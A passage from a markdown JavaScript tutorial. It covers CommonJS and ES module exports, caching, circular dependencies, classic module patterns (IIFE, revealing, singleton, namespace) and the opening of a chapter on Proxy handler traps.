module.exports = class Calculator {
  add(a, b) {
    return a + b;
  }
};

// âœ… Export multiple values
const config = { debug: true };
const version = '1.0.0';

module.exports = {
  config,
  version
};

// âœ… Export and extend
module.exports = {
  name: 'MyModule'
};

module.exports.additional = 'value';
```

### exports Shorthand

```javascript
// âœ… exports is shorthand for module.exports
exports.add = (a, b) => a + b;
exports.subtract = (a, b) => a - b;

// âœ… Equivalent to:
module.exports.add = (a, b) => a + b;
module.exports.subtract = (a, b) => a - b;

// âŒ BUT: Don't reassign exports
// This breaks the connection to module.exports:
// exports = { add, subtract };  // âœ— Won't work

// âœ… Use module.exports instead:
module.exports = { add, subtract };  // âœ“ Works
```

### When to Use Each

```javascript
// âœ… Use exports for adding properties
exports.helper1 = () => { };
exports.helper2 = () => { };
exports.config = { };

// âœ… Use module.exports to replace everything
module.exports = class MyClass { };

module.exports = function main() { };

module.exports = {
  setup: () => { },
  teardown: () => { }
};
```

---

## Module Caching

### How Module Caching Works

```javascript
// âœ… Modules are cached after first require
const math1 = require('./math.js');
const math2 = require('./math.js');

console.log(math1 === math2);  // true (same object reference)

// Module code executes only once
```

### Cache Behavior

```javascript
// module.js
console.log('Module loaded');

let counter = 0;

exports.increment = () => ++counter;
exports.getCounter = () => counter;

// app.js
const mod1 = require('./module.js');  // Logs: "Module loaded"

mod1.increment();
console.log(mod1.getCounter());       // 1

const mod2 = require('./module.js');  // No log (cached)

mod2.increment();
console.log(mod2.getCounter());       // 2 (shared state)

console.log(mod1 === mod2);           // true (same module)
```

### Clearing Cache

```javascript
// âœ… Delete module from cache
delete require.cache[require.resolve('./module.js')];

// Next require will re-execute the module
const mod = require('./module.js');  // Executes again

// âœ… Clear all cache
Object.keys(require.cache).forEach(key => {
  delete require.cache[key];
});

// âš ï¸ Generally not recommended in production
```

### Cache ID

```javascript
// âœ… Get module cache ID
const moduleId = require.resolve('./math.js');
console.log(moduleId);  // /full/path/to/math.js

// Module cache uses full paths as keys
console.log(require.cache[moduleId]);  // Module object
```

---

## Circular Dependencies

### The Problem

```javascript
// âŒ Circular dependency example
// a.js
const b = require('./b.js');

console.log('a: b.value =', b.value);

module.exports = { value: 'a' };

// b.js
const a = require('./a.js');

console.log('b: a.value =', a.value);

module.exports = { value: 'b' };

// Running: node a.js
// Output:
// b: a.value = undefined  (a not fully loaded yet)
// a: b.value = b
```

### Solution 1: Restructure

```javascript
// âœ… Move shared code to separate module
// shared.js
module.exports = {
  sharedFunction: () => { }
};

// a.js
const shared = require('./shared.js');
const b = require('./b.js');

module.exports = {
  valueA: 'a'
};

// b.js
const shared = require('./shared.js');
const a = require('./a.js');

module.exports = {
  valueB: 'b'
};
```

### Solution 2: Lazy Load

```javascript
// âœ… Require inside function (lazy loading)
// a.js
module.exports = {
  getValue: () => {
    const b = require('./b.js');  // Load when needed
    return b.value;
  },
  value: 'a'
};

// b.js
module.exports = {
  getValue: () => {
    const a = require('./a.js');  // Load when needed
    return a.value;
  },
  value: 'b'
};
```

### Solution 3: Dependency Injection

```javascript
// âœ… Pass dependencies as arguments
// a.js
function setup(b) {
  console.log('a initialized with b:', b.value);
  return { value: 'a', b };
}

module.exports = { setup };

// b.js
function setup(a) {
  console.log('b initialized with a:', a.value);
  return { value: 'b', a };
}

module.exports = { setup };

// main.js
const aModule = require('./a.js');
const bModule = require('./b.js');

const a = aModule.setup(null);
const b = bModule.setup(null);

a.b = b;
b.a = a;
```

---

## ESM vs CommonJS

### Comparison

| Feature | ESM | CommonJS |
|---------|-----|----------|
| **Syntax** | `import`/`export` | `require()`/`module.exports` |
| **Loading** | Async | Sync |
| **Standard** | ES6+ official | Node.js custom |
| **Tree-shaking** | âœ… Yes | âŒ Difficult |
| **Top-level await** | âœ… Yes | âŒ No |
| **Dynamic import** | âœ… `import()` | âœ… `require()` |
| **Default export** | âœ… Yes | Single export only |
| **Named exports** | âœ… Multiple | Via object properties |
| **Circular deps** | Partial | Full support |

### Code Comparison

```javascript
// âœ… CommonJS
const math = require('./math.js');
const { add } = require('./math.js');

module.exports = { greet: () => 'hi' };
exports.helper = () => { };

// âœ… ESM
import math from './math.js';
import { add } from './math.js';

export default { greet: () => 'hi' };
export function helper() { }
```

---

## ESM/CommonJS Interoperability

### ESM Importing CommonJS

```javascript
// âœ… Import CommonJS module into ESM
// math.js (CommonJS)
module.exports = {
  add: (a, b) => a + b
};

// app.mjs (ESM)
import math from './math.js';
console.log(math.add(5, 3));  // Works

// âœ… Importing named exports
import * as math from './math.js';
console.log(math.add(5, 3));  // Works
```

### CommonJS Requiring ESM

```javascript
// âŒ CommonJS cannot directly require ESM
const esm = require('./module.mjs');  // Error!

// âœ… Use dynamic import instead
(async () => {
  const esm = await import('./module.mjs');
  console.log(esm);
})();

// âœ… Or use conditional import
async function loadESM() {
  return await import('./module.mjs');
}
```

### Dual Package Support

```javascript
// package.json
{
  "name": "my-package",
  "main": "./dist/index.js",           // CommonJS
  "module": "./dist/index.mjs",        // ESM
  "exports": {
    ".": {
      "import": "./dist/index.mjs",    // ESM
      "require": "./dist/index.js"     // CommonJS
    }
  }
}

// Consumers can use either:
// CommonJS: const pkg = require('my-package');
// ESM: import pkg from 'my-package';
```

---

## Best Practices

### âœ… DO

```javascript
// âœ… Use module.exports for main export
module.exports = class User { };

// âœ… Use exports for multiple utilities
exports.helper1 = () => { };
exports.helper2 = () => { };

// âœ… Require at top of file (usually)
const express = require('express');
const config = require('./config.js');

// âœ… Use destructuring for readability
const { add, subtract } = require('./math.js');

// âœ… Handle optional dependencies
try {
  const optional = require('optional');
} catch (e) {
  // Handle missing package
}

// âœ… Use relative paths for local modules
const utils = require('./utils.js');
const config = require('../config.js');
```

### âŒ DON'T

```javascript
// âŒ Don't mix exports and module.exports
exports.helper = () => { };
module.exports = { setup };  // Overwrites exports!

// âŒ Don't reassign exports
exports = { add, subtract };  // Breaks connection!

// âŒ Don't require in loops (performance issue)
for (const file of files) {
  const mod = require(`./modules/${file}`);  // Avoid
}

// âœ… Better:
const modules = {};
for (const file of files) {
  modules[file] = require(`./modules/${file}`);
}

// âŒ Don't use with await (not supported)
// const mod = await require('./module.js');  // Error

// âœ… Use dynamic import:
// const mod = await import('./module.mjs');

// âŒ Don't create circular dependencies
// a.js: require('./b.js');
// b.js: require('./a.js');  // âœ— Problematic

// âœ… Use dependency injection instead
```

---

## Summary

### CommonJS Quick Reference

```javascript
// Exporting
module.exports = { };
module.exports = function() { };
exports.helper = () => { };

// Importing
const mod = require('./module.js');
const { helper } = require('./module.js');
const express = require('express');
```

### Module.exports vs exports

| Aspect | module.exports | exports |
|--------|------------------|---------|
| **Reassign** | âœ… Yes | âŒ No |
| **Add properties** | âœ… Yes | âœ… Yes |
| **Replace object** | âœ… Yes | âŒ Breaks |
| **Primary use** | âœ… Main export | âœ… Multiple utilities |

### When to Use CommonJS vs ESM

| Scenario | Use |
|----------|-----|
| **Node.js app** | CommonJS (or ESM with `.mjs`) |
| **npm package** | Both (dual export) |
| **Browser** | ESM |
| **Modern project** | ESM |
| **Legacy code** | CommonJS |

### Next Steps

- Learn module patterns for code organization
- Master both CommonJS and ESM
- Understand module loading strategies
- Build modular applications
## Module Patterns 



## Module Pattern (IIFE)

### Basic Module Pattern

**IIFE** = Immediately Invoked Function Expression

```javascript
// âœ… Basic structure
const calculator = (function() {
  // Private variables and functions
  let result = 0;

  function logOperation(op, a, b) {
    console.log(`${op}: ${a} ${op} ${b}`);
  }

  // Return public API
  return {
    add: (a, b) => {
      logOperation('+', a, b);
      return a + b;
    },
    subtract: (a, b) => {
      logOperation('-', a, b);
      return a - b;
    }
  };
})();

console.log(calculator.add(5, 3));       // 8 + private logOperation
console.log(calculator.subtract(5, 3));  // 2
```

### Private vs Public

```javascript
// âœ… Private (inside IIFE)
const userModule = (function() {
  // Private
  const password = 'secret';
  
  function validatePassword(pwd) {
    return pwd === password;
  }

  // Public
  return {
    login: (pwd) => {
      if (validatePassword(pwd)) {
        console.log('Login successful');
        return true;
      }
      return false;
    }
  };
})();

// Can access public method
userModule.login('secret');

// Cannot access private password or validatePassword
// userModule.password;           // undefined
// userModule.validatePassword(); // undefined
```

### Shared State with Module Pattern

```javascript
// âœ… Maintain state across calls
const counter = (function() {
  let count = 0;

  return {
    increment: () => ++count,
    decrement: () => --count,
    get: () => count,
    reset: () => { count = 0; }
  };
})();

counter.increment();
counter.increment();
console.log(counter.get());  // 2

counter.decrement();
console.log(counter.get());  // 1

counter.reset();
console.log(counter.get());  // 0
```

### Module Parameters

```javascript
// âœ… Pass dependencies to module
const calculator = (function(Math) {
  return {
    sqrt: (n) => Math.sqrt(n),
    pow: (a, b) => Math.pow(a, b),
    random: () => Math.random()
  };
})(Math);  // Pass global Math as dependency

console.log(calculator.sqrt(16));  // 4
console.log(calculator.pow(2, 3)); // 8
```

### Advanced Module Pattern

```javascript
// âœ… Complex module with initialization
const userManager = (function() {
  // Private
  let users = [];
  let nextId = 1;

  function findUserById(id) {
    return users.find(u => u.id === id);
  }

  function validateEmail(email) {
    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
  }

  // Public API
  return {
    addUser: (name, email) => {
      if (!validateEmail(email)) {
        return { success: false, error: 'Invalid email' };
      }

      const user = { id: nextId++, name, email };
      users.push(user);
      return { success: true, user };
    },

    getUser: (id) => {
      return findUserById(id) || null;
    },

    getAllUsers: () => {
      return [...users];  // Return copy
    },

    deleteUser: (id) => {
      const index = users.findIndex(u => u.id === id);
      if (index === -1) return false;
      users.splice(index, 1);
      return true;
    }
  };
})();

userManager.addUser('Alice', 'alice@example.com');
userManager.addUser('Bob', 'bob@example.com');
console.log(userManager.getAllUsers());
```

---

## Revealing Module Pattern

### What is Revealing Module Pattern?

The **Revealing Module Pattern** reveals explicitly chosen variables and methods as public API while hiding the rest.

```javascript
// âœ… Revealing module pattern
const app = (function() {
  // Private
  let count = 0;
  const MAX = 100;

  const increment = () => {
    if (count < MAX) count++;
  };

  const decrement = () => {
    if (count > 0) count--;
  };

  const getCount = () => count;

  const reset = () => {
    count = 0;
  };

  // Reveal specific methods
  return {
    add: increment,
    subtract: decrement,
    display: getCount,
    clear: reset
  };
})();

app.add();
console.log(app.display());  // 1
app.clear();
console.log(app.display());  // 0
```

### Revealing with Aliases

```javascript
// âœ… Use public names that differ from private
const userService = (function() {
  // Private implementation
  const getAllUsers = () => {
    return [
      { id: 1, name: 'Alice' },
      { id: 2, name: 'Bob' }
    ];
  };

  const getUserById = (id) => {
    const users = getAllUsers();
    return users.find(u => u.id === id);
  };

  const updateUser = (id, data) => {
    // Implementation
    console.log(`Updated user ${id}`);
  };

  // Public API with revealing
  return {
    list: getAllUsers,        // Public: list
    find: getUserById,        // Public: find
    update: updateUser        // Public: update
  };
})();

console.log(userService.list());
console.log(userService.find(1));
```

### Revealing with Dependencies

```javascript
// âœ… Reveal methods that depend on private state
const cache = (function() {
  // Private storage
  const store = {};
  const hits = { count: 0 };
  const misses = { count: 0 };

  const set = (key, value) => {
    store[key] = value;
  };

  const get = (key) => {
    if (key in store) {
      hits.count++;
      return store[key];
    }
    misses.count++;
    return undefined;
  };

  const clear = () => {
    Object.keys(store).forEach(key => delete store[key]);
    hits.count = 0;
    misses.count = 0;
  };

  const stats = () => ({
    hits: hits.count,
    misses: misses.count,
    hitRate: hits.count / (hits.count + misses.count)
  });

  // Reveal public API
  return { set, get, clear, stats };
})();

cache.set('user1', { name: 'Alice' });
console.log(cache.get('user1'));  // { name: 'Alice' }
console.log(cache.get('user2'));  // undefined
console.log(cache.stats());       // { hits: 1, misses: 1, hitRate: 0.5 }
```

---

## Singleton Pattern

### What is Singleton Pattern?

**Singleton** ensures only one instance of an object exists throughout the application.

```javascript
// âœ… Basic singleton
const database = (function() {
  let instance = null;

  function createInstance() {
    return {
      query: (sql) => console.log(`Executing: ${sql}`),
      close: () => console.log('Connection closed')
    };
  }

  return {
    getInstance: () => {
      if (!instance) {
        instance = createInstance();
      }
      return instance;
    }
  };
})();

const db1 = database.getInstance();
const db2 = database.getInstance();

console.log(db1 === db2);  // true (same instance)
```

### Lazy Initialization

```javascript
// âœ… Lazy singleton - create only when first needed
const appConfig = (() => {
  let instance = null;

  function createConfig() {
    console.log('Initializing config...');
    return {
      apiUrl: 'https://api.example.com',
      debug: true,
      timeout: 5000
    };
  }

  return {
    getInstance: () => {
      if (!instance) {
        instance = createConfig();
      }
      return instance;
    }
  };
})();

console.log('App started');
// Config not created yet

const config = appConfig.getInstance();
// Now: Initializing config...

const config2 = appConfig.getInstance();
console.log(config === config2);  // true
```

### Singleton with Methods

```javascript
// âœ… Singleton with instance methods
const eventBus = (() => {
  let instance = null;

  function createBus() {
    const listeners = {};

    return {
      on: (event, callback) => {
        if (!listeners[event]) {
          listeners[event] = [];
        }
        listeners[event].push(callback);
      },

      emit: (event, data) => {
        if (listeners[event]) {
          listeners[event].forEach(cb => cb(data));
        }
      },

      off: (event, callback) => {
        if (listeners[event]) {
          listeners[event] = listeners[event].filter(
            cb => cb !== callback
          );
        }
      }
    };
  }

  return {
    getInstance: () => {
      if (!instance) {
        instance = createBus();
      }
      return instance;
    }
  };
})();

const bus = eventBus.getInstance();

bus.on('user-login', (user) => {
  console.log(`User logged in: ${user}`);
});

bus.emit('user-login', 'Alice');
```

### Singleton Counter

```javascript
// âœ… Practical singleton - application logger
const logger = (() => {
  let instance = null;

  function createLogger() {
    const logs = [];
    let level = 'INFO';

    return {
      setLevel: (newLevel) => {
        level = newLevel;
      },

      info: (message) => {
        logs.push({ level: 'INFO', message, time: new Date() });
        console.log(`[INFO] ${message}`);
      },

      error: (message) => {
        logs.push({ level: 'ERROR', message, time: new Date() });
        console.error(`[ERROR] ${message}`);
      },

      debug: (message) => {
        if (level === 'DEBUG') {
          logs.push({ level: 'DEBUG', message, time: new Date() });
          console.log(`[DEBUG] ${message}`);
        }
      },

      getLogs: () => [...logs]
    };
  }

  return {
    getInstance: () => {
      if (!instance) {
        instance = createLogger();
      }
      return instance;
    }
  };
})();

const log = logger.getInstance();
log.info('App started');
log.error('Connection failed');
console.log(log.getLogs());
```

---

## Namespace Pattern

### Basic Namespace

```javascript
// âœ… Create namespace to organize code
const MyApp = {
  utils: {
    formatDate: (date) => date.toLocaleDateString(),
    capitalize: (str) => str.charAt(0).toUpperCase() + str.slice(1)
  },

  models: {
    User: function(name, email) {
      this.name = name;
      this.email = email;
    },
    Post: function(title, content) {
      this.title = title;
      this.content = content;
    }
  }
};

// Usage
console.log(MyApp.utils.formatDate(new Date()));
const user = new MyApp.models.User('Alice', 'alice@example.com');
```

### Nested Namespaces

```javascript
// âœ… Hierarchical namespace
const App = {
  admin: {
    dashboard: {
      widgets: {
        chart: () => console.log('Rendering chart'),
        table: () => console.log('Rendering table')
      },
      settings: {
        theme: 'dark',
        language: 'en'
      }
    }
  },

  user: {
    profile: {
      view: () => console.log('Viewing profile'),
      edit: () => console.log('Editing profile')
    }
  }
};

App.admin.dashboard.widgets.chart();
App.user.profile.view();
```

### Namespace Extension

```javascript
// âœ… Extend namespace dynamically
const Library = {};

// Module 1
Library.math = {
  add: (a, b) => a + b,
  subtract: (a, b) => a - b
};

// Module 2
Library.string = {
  capitalize: (str) => str.charAt(0).toUpperCase() + str.slice(1),
  reverse: (str) => str.split('').reverse().join('')
};

// Module 3 extending math
Library.math.multiply = (a, b) => a * b;
Library.math.divide = (a, b) => a / b;

console.log(Library.math.add(5, 3));
console.log(Library.string.capitalize('hello'));
```

---

## Comparison of Patterns

### Feature Comparison

| Feature | Module Pattern | Revealing | Singleton | Namespace |
|---------|-----------------|-----------|-----------|-----------|
| **Privacy** | âœ… Full | âœ… Full | âœ… Full | âŒ Partial |
| **Single instance** | âŒ No | âŒ No | âœ… Yes | âŒ No |
| **Organization** | âœ… Good | âœ… Good | âœ… Good | âœ… Excellent |
| **Flexibility** | âœ… High | âœ… High | âŒ Limited | âœ… Very High |
| **Complexity** | â­ 2 | â­ 2 | â­ 3 | â­ 2 |

### When to Use Each

```javascript
// âœ… Module Pattern: Multiple independent instances
const user1 = (function() {
  let name = 'Alice';
  return { getName: () => name };
})();

const user2 = (function() {
  let name = 'Bob';
  return { getName: () => name };
})();

// âœ… Revealing: Clear public API, complex logic
const service = (function() {
  const internalState = [];
  const internalCalc = () => { };
  
  return {
    publicMethod: internalCalc,
    getData: () => internalState
  };
})();

// âœ… Singleton: Only one instance needed (logger, config)
const config = (() => {
  let instance = null;
  // ...
  return { getInstance: () => { /* ... */ } };
})();

// âœ… Namespace: Organize many modules
const API = {
  users: { /* ... */ },
  posts: { /* ... */ },
  comments: { /* ... */ }
};
```

---

## Modern Approach

### Why Modern ES Modules are Better

```javascript
// âŒ Old module pattern (complex)
const calculator = (function() {
  return {
    add: (a, b) => a + b
  };
})();

// âœ… Modern ES6+ approach (simple)
export function add(a, b) {
  return a + b;
}

// âœ… Or with privacy
const privateData = 'secret';

export const publicAPI = {
  method: () => { /* uses privateData */ }
};
```

### Migration Path

```javascript
// Legacy: Module pattern with IIFE
const oldModule = (function() {
  let private = 0;
  return {
    increment: () => ++private,
    get: () => private
  };
})();

// Modern: ES module
// counter.js
let private = 0;

export function increment() {
  return ++private;
}

export function get() {
  return private;
}

// app.js
import { increment, get } from './counter.js';
```

---

## Best Practices

### âœ… DO

```javascript
// âœ… Use ES modules (modern approach)
export function helper() { }
import { helper } from './module.js';

// âœ… Encapsulate private data with IIFE if needed
const module = (function() {
  const privateVar = 'private';
  return { publicMethod: () => { } };
})();

// âœ… Use singleton for shared instances
const logger = (() => {
  let instance = null;
  return {
    getInstance: () => {
      if (!instance) instance = createLogger();
      return instance;
    }
  };
})();

// âœ… Use namespaces to organize (if not using modules)
const App = {
  admin: { /* admin module */ },
  user: { /* user module */ }
};

// âœ… Be consistent with naming
const MyModule = { /* ... */ };  // PascalCase for objects
```

### âŒ DON'T

```javascript
// âŒ Don't pollute global scope
function helper() { }  // Avoid if possible

// âŒ Don't use module patterns when ES modules work
const oldStyle = (function() { return { }; })();

// âŒ Don't create complex nested namespaces
// const x = { a: { b: { c: { d: { } } } } };

// âŒ Don't forget to reveal public API
const bad = (function() {
  const public = () => { };
  const private = () => { };
  // No return statement = nothing exposed!
})();

// âŒ Don't mix patterns inconsistently
const part1 = { };  // Namespace
const part2 = (function() { return { }; })();  // Module
const part3 = (() => {
  let i = null;
  return { getInstance: () => i };  // Singleton
})();
```

---

## Summary

### Module Pattern Overview

| Pattern | Structure | Use Case | Complexity |
|---------|-----------|----------|-----------|
| **IIFE Module** | `(function() { return {}; })()` | Encapsulation | Low |
| **Revealing** | IIFE with explicit reveal | Clean API | Low |
| **Singleton** | Lazy instance creation | Single instance | Medium |
| **Namespace** | Nested objects | Organization | Low |

### Quick Reference

```javascript
// Module Pattern
const module = (function() {
  const private = 'data';
  return { public: () => { } };
})();

// Revealing Module
const module = (function() {
  const _private = () => { };
  const public = () => _private();
  return { public };
})();

// Singleton
const singleton = (() => {
  let instance;
  return {
    getInstance: () => {
      if (!instance) instance = { };
      return instance;
    }
  };
})();

// Namespace
const app = {
  module1: { /* ... */ },
  module2: { /* ... */ }
};
```

### Modern Alternative

```javascript
// ES Module (preferred)
// math.js
export function add(a, b) { return a + b; }
export function subtract(a, b) { return a - b; }

// app.js
import { add, subtract } from './math.js';
```

### When to Use Patterns

- **Modern projects**: Use ES modules
- **Legacy code**: Understand these patterns
- **Browser compatibility**: May need module patterns
- **Private data**: ES modules + closures
- **Single instance**: Singleton pattern
- **Code organization**: Namespace or ES modules

---

## Common Pitfalls

### Pitfall 1: import Not at Top Level

```javascript
// âŒ WRONG: import must be at top level
function loadModule() {
  import { helper } from './helper.js';  // SyntaxError!
}

// âœ… CORRECT: Static imports at top
import { helper } from './helper.js';

// âœ… CORRECT: Dynamic import for conditional loading
async function loadModule() {
  const { helper } = await import('./helper.js');
}
```

### Pitfall 2: Circular Dependencies

```javascript
// âŒ PROBLEM: Circular import can cause undefined values

// a.js
import { b } from './b.js';
export const a = 'A value: ' + b;  // b might be undefined!

// b.js
import { a } from './a.js';
export const b = 'B value: ' + a;  // a might be undefined!

// âœ… SOLUTION: Restructure to break the cycle
// shared.js (no imports from a.js or b.js)
export const shared = 'shared';

// Or use factory functions
export function getA() { return 'A'; }
export function getB() { return 'B'; }
```

### Pitfall 3: Named vs Default Import Mismatch

```javascript
// module.js
export default function main() {}
export const helper = () => {};

// âŒ WRONG: Using braces for default import
import { main } from './module.js';  // undefined! main is not named export

// âŒ WRONG: No braces for named import  
import helper from './module.js';  // Gets the default, not helper!

// âœ… CORRECT
import main from './module.js';           // Default (no braces)
import { helper } from './module.js';     // Named (braces)
import main, { helper } from './module.js';  // Both
```

### Pitfall 4: Live Bindings Surprise

```javascript
// counter.js
export let count = 0;
export function increment() {
  count++;
}

// main.js
import { count, increment } from './counter.js';

console.log(count);  // 0
increment();
console.log(count);  // 1 â€” live binding updated!

// âŒ BUT: You can't reassign imported bindings
count = 5;  // TypeError: Assignment to constant variable
```

### Pitfall 5: Missing File Extensions

```javascript
// âŒ WRONG: No extension in browser ES modules
import { helper } from './helper';  // Fails in browser!

// âœ… CORRECT: Include extension for browser ES modules
import { helper } from './helper.js';

// Note: Node.js and bundlers may work without extensions
// but browser native ES modules require them
```

### Pitfall 6: this in Modules

```javascript
// âŒ GOTCHA: Module-level 'this' is undefined (not window/global)
console.log(this);  // undefined in ES modules

// âœ… Use globalThis for cross-environment global access
console.log(globalThis);  // window in browser, global in Node
```

---

### Next Steps

- Master ES modules (modern standard)
- Understand legacy patterns for existing code
- Combine patterns as needed
- Build scalable, organized applications

## 14.4 Modules Summary

| Feature | ES Modules | CommonJS |
|---------|------------|----------|
| Syntax | `import`/`export` | `require`/`module.exports` |
| Loading | Async | Sync |
| Scope | Strict mode | Non-strict |
| Hoisting | Yes (live bindings) | No |
| Browser | Native | Needs bundler |

---

**End of Chapter 14: Modules**


# 15-Proxy-and-Reflection.md

# 15 Proxy and Reflection

---

# Proxy and Reflection


## 15.1 Proxy

Proxies allow you to create an object that wraps another object and intercepts fundamental operations on it. This provides powerful metaprogramming capabilities.

### Proxy Constructor

The Proxy constructor creates a proxy object that wraps a target object with a handler containing traps.

**Basic Syntax:**

```javascript
const proxy = new Proxy(target, handler);
```

**Simple Example:**

```javascript
const target = {
  name: 'Alice',
  age: 30
};

const handler = {
  get(target, property, receiver) {
    console.log(`Getting property: ${property}`);
    return target[property];
  },
  
  set(target, property, value, receiver) {
    console.log(`Setting property: ${property} = ${value}`);
    target[property] = value;
    return true;
  }
};

const proxy = new Proxy(target, handler);

console.log(proxy.name); // "Getting property: name" then "Alice"
proxy.age = 31; // "Setting property: age = 31"
console.log(proxy.age); // "Getting property: age" then 31
```

**No-Op Proxy (Transparent Wrapper):**

```javascript
// Empty handler - proxy behaves exactly like target
const target = { value: 42 };
const proxy = new Proxy(target, {});

console.log(proxy.value); // 42
proxy.value = 100;
console.log(proxy.value); // 100
console.log(target.value); // 100 (target is modified)
```

### Handler Traps: `get`, `set`, `has`

These are the most commonly used traps for intercepting property access.

**`get` Trap:**

```javascript
const handler = {
  get(target, property, receiver) {
    // target: the original object
    // property: the property name being accessed
    // receiver: the proxy or object that inherits from it
    
    console.log(`Accessing: ${property}`);
    
    if (property in target) {
      return target[property];
    }
    return `Property "${property}" not found`;
  }
};

const obj = { name: 'Alice', age: 30 };
const proxy = new Proxy(obj, handler);

console.log(proxy.name); // "Accessing: name" then "Alice"
console.log(proxy.missing); // "Accessing: missing" then 'Property "missing" not found'
```

**Advanced `get` - Default Values:**

```javascript
const withDefaults = (target, defaults) => {
  return new Proxy(target, {
    get(target, property) {
      return property in target ? target[property] : defaults[property];
    }
  });
};

const config = withDefaults(
  { host: 'localhost' },
  { host: '127.0.0.1', port: 3000, protocol: 'http' }
);

console.log(config.host); // 'localhost' (from target)
console.log(config.port); // 3000 (from defaults)
console.log(config.protocol); // 'http' (from defaults)
```

**`set` Trap:**

```javascript
const validator = {
  set(target, property, value, receiver) {
    console.log(`Setting ${property} to ${value}`);
    
    // Validation logic
    if (property === 'age') {
      if (typeof value !== 'number') {
        throw new TypeError('Age must be a number');
      }
      if (value < 0 || value > 150) {
        throw new RangeError('Age must be between 0 and 150');
      }
    }
    
    if (property === 'email') {
      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
      if (!emailRegex.test(value)) {
        throw new Error('Invalid email format');
      }
    }
    
    target[property] = value;
    return true; // Indicate success
  }
};

const user = new Proxy({}, validator);

user.name = 'Alice'; // Works
user.age = 30; // Works
user.email = 'alice@example.com'; // Works

try {
  user.age = 'thirty'; // TypeError: Age must be a number
} catch (e) {
  console.log(e.message);
}

try {
  user.email = 'invalid-email'; // Error: Invalid email format
} catch (e) {
  console.log(e.message);
}
```

**`set` Trap - Read-Only Properties:**

```javascript
const readOnly = (target, readOnlyProps) => {
  return new Proxy(target, {
    set(target, property, value) {
      if (readOnlyProps.includes(property)) {
        throw new Error(`Cannot modify read-only property: ${property}`);
      }
      target[property] = value;
      return true;
    }
  });
};

const obj = readOnly(
  { id: 1, name: 'Alice', role: 'user' },
  ['id']
);

obj.name = 'Bob'; // Works
obj.role = 'admin'; // Works

try {
  obj.id = 2; // Error: Cannot modify read-only property: id
} catch (e) {
  console.log(e.message);
}
```

**`has` Trap:**

```javascript
const handler = {
  has(target, property) {
    console.log(`Checking if property "${property}" exists`);
    
    // Hide private properties (starting with _)
    if (property.startsWith('_')) {
      return false;
    }
    
    return property in target;
  }
};

const obj = new Proxy(
  { name: 'Alice', _password: 'secret', age: 30 },
  handler
);

console.log('name' in obj); // true
console.log('age' in obj); // true
console.log('_password' in obj); // false (hidden)
console.log('missing' in obj); // false
```

**Combined `get`, `set`, `has` Example:**

```javascript
const createSecureObject = (target) => {
  return new Proxy(target, {
    get(target, property) {
      if (property.startsWith('_')) {
        throw new Error(`Cannot access private property: ${property}`);
      }
      return target[property];
    },
    
    set(target, property, value) {
      if (property.startsWith('_')) {
        throw new Error(`Cannot modify private property: ${property}`);
      }
      target[property] = value;
      return true;
    },
    
    has(target, property) {
      if (property.startsWith('_')) {
        return false;
      }
      return property in target;
    }
  });
};

const secure = createSecureObject({
  publicData: 'visible',
  _privateData: 'hidden'
});

console.log(secure.publicData); // 'visible'
console.log('publicData' in secure); // true
console.log('_privateData' in secure); // false

try {
  console.log(secure._privateData); // Error
} catch (e) {
  console.log(e.message); // "Cannot access private property: _privateData"
}
```

### Handler Traps: `deleteProperty`

The `deleteProperty` trap intercepts the `delete` operator.

**Basic `deleteProperty`:**

```javascript
const handler = {
  deleteProperty(target, property) {
    console.log(`Deleting property: ${property}`);
    
    if (property.startsWith('_')) {
      throw new Error(`Cannot delete private property: ${property}`);
    }
    
    delete target[property];
    return true; // Indicate success
  }
};

const obj = new Proxy(
  { name: 'Alice', _id: 123, age: 30 },
  handler
);

delete obj.name; // "Deleting property: name" - works
console.log(obj.name); // undefined

try {
  delete obj._id; // Error: Cannot delete private property: _id
} catch (e) {
  console.log(e.message);
}
```

**Preventing Deletion of Specific Properties:**

```javascript
const preventDelete = (target, protectedProps) => {
  return new Proxy(target, {
    deleteProperty(target, property) {
      if (protectedProps.includes(property)) {
        console.log(`Property "${property}" is protected and cannot be deleted`);
        return false;
      }
      delete target[property];
      return true;
    }
  });
};

const config = preventDelete(
  { host: 'localhost', port: 3000, debug: true },
  ['host', 'port'] // Protected properties
);

delete config.debug; // Works
console.log(config.debug); // undefined

delete config.host; // "Property "host" is protected..."
console.log(config.host); // 'localhost' (still there)
```

**Logging Deletions:**

```javascript
const trackDeletions = (target) => {
  const deletedProps = [];
  
  return {
    proxy: new Proxy(target, {
      deleteProperty(target, property) {
        deletedProps.push({
          property,
          value: target[property],
          timestamp: new Date()
        });
        delete target[property];
        return true;
      }
    }),
    getDeleted() {
      return deletedProps;
    }
  };
};

const { proxy, getDeleted } = trackDeletions({
  a: 1,
  b: 2,
  c: 3
});

delete proxy.a;
delete proxy.b;

console.log(getDeleted());
// [
//   { property: 'a', value: 1, timestamp: ... },
//   { property: 'b', value: 2, timestamp: ... }
// ]
```

### Handler Traps: `ownKeys`, `getOwnPropertyDescriptor`

These traps intercept property enumeration operations.

**`ownKeys` Trap:**

```javascript
const handler = {
  ownKeys(target) {
    console.log('Getting own keys');
    
    // Filter out private properties
    return Object.keys(target).filter(key => !key.startsWith('_'));
  }
};

const obj = new Proxy(
  { name: 'Alice', _password: 'secret', age: 30, _internal: 'hidden' },
  handler
);

console.log(Object.keys(obj)); // ['name', 'age']
console.log(Object.getOwnPropertyNames(obj)); // ['name', 'age']

for (let key in obj) {
  console.log(key); // Only 'name' and 'age'
}
```

**`ownKeys` with Custom Ordering:**

```javascript
const sortedKeys = new Proxy(
  { zebra: 1, apple: 2, mango: 3, banana: 4 },
  {
    ownKeys(target) {
      return Object.keys(target).sort();
    }
  }
);

console.log(Object.keys(sortedKeys)); 
// ['apple', 'banana', 'mango', 'zebra']
```

**`getOwnPropertyDescriptor` Trap:**

```javascript
const handler = {
  getOwnPropertyDescriptor(target, property) {
    console.log(`Getting descriptor for: ${property}`);
    
    // Hide private properties
    if (property.startsWith('_')) {
      return undefined;
    }
    
    return Object.getOwnPropertyDescriptor(target, property);
  },
  
  ownKeys(target) {
    // Also filter in ownKeys for consistency
    return Object.keys(target).filter(key => !key.startsWith('_'));
  }
};

const obj = new Proxy(
  { name: 'Alice', _password: 'secret' },
  handler
);

console.log(Object.getOwnPropertyDescriptor(obj, 'name'));
// { value: 'Alice', writable: true, enumerable: true, configurable: true }

console.log(Object.getOwnPropertyDescriptor(obj, '_password'));
// undefined (hidden)
```

**Making Properties Appear Read-Only:**

```javascript
const readOnlyView = (target) => {
  return new Proxy(target, {
